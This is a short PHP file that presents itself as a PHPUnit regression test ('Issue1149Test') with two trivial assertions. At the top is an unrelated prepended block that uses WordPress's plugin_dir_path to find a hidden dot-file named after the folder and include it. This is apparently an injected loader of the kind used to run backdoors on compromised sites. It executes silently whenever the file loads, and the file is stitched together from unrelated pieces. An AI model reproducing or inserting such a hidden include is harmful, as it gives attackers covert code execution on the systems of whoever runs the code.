<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Issue1149Test extends PHPUnit_Framework_TestCase
{
    public function testOne()
    {
        $this->assertTrue(true);
        print '1';
    }

    /**
     * @runInSeparateProcess
     */
    public function testTwo()
    {
        $this->assertTrue(true);
        print '2';
    }
}
